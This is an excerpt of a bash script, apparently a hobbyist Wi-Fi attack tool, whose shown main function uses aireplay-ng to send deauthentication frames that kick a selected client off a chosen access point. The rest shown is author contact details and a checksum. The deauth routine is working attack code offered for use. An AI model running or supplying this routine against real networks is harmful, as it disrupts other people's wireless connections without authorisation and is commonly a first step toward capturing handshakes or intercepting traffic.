...
function main {
	...
	then
		...
		echo "Press control +c when client is kicked !"
                if [ $kickeme = 1 ]
                then
                	xterm -hold -e aireplay-ng --deauth=1 -a $gd -c $d1 $gc &
                elif [ $kickeme = 2 ]
                then
                        xterm -hold -e aireplay-ng --deauth=1 -a $gd -c $d2 $gc &
                elif [ $kickeme = 3 ]
                then
                        xterm -hold -e aireplay-ng --deauth=1 -a $gd -c $d3 $gc &
                elif [ $kickeme = 4 ]
                then
                        xterm -hold -e aireplay-ng --deauth=1 -a $gd -c $d4 $gc &
                else
                        echo "Please enter a valid input"
                fi
...
function selectgp {
	...
	echo ""
	echo "the sha256sum without this echo statement is : d6ac3d598c89d1f858cc0585c09706a6e62883bb979e2d6779042bc657a40a82 "
	echo ""
	echo "if u have any query then let me know using the following methods"
	echo "email :notascriptK.7@gmail.com"
	echo "youtube (through this script intro. video comment section !)  : "'"https://www.youtube.com/channel/UCj4NYpZJPjIro4iAWEahTvg"'" |"
